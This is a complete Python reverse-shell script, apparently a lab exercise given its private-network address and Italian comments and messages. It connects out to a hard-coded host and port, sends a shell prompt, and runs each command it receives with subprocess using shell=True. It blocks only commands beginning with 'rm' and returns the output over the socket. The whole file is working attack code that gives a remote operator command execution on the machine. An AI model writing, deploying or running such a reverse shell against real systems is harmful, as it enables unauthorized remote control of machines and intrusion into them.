import socket as so
import os
import subprocess

SRV_ADDR = "192.168.56.105" 
SRV_PORT = 4445              
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((SRV_ADDR, SRV_PORT))  

percorso_partenza = os.getcwd()

while True:
    prompt = "[" + percorso_partenza + "]$ "
    s.sendall(prompt.encode("utf-8"))


    data = s.recv(1024)
    if not data:
        break  

    comando = data.decode("utf-8")
    result = ""

    if comando.startswith('cd'):
        os.chdir(comando.replace("cd ", "").strip())
        percorso_partenza = os.getcwd()
        result = f"Directory cambiata a {percorso_partenza}"
    elif comando.startswith('rm'):
        result = "Ci hai provato!"
    else:
        res = subprocess.run(comando, cwd=percorso_partenza, shell=True, capture_output=True, text=True)
        result = res.stdout if res.stdout else "Comando eseguito senza output."
        if res.stderr:
            result += f"\nErrore: {res.stderr}"

    result += "\n"
    s.sendall(result.encode("utf-8"))

s.close()
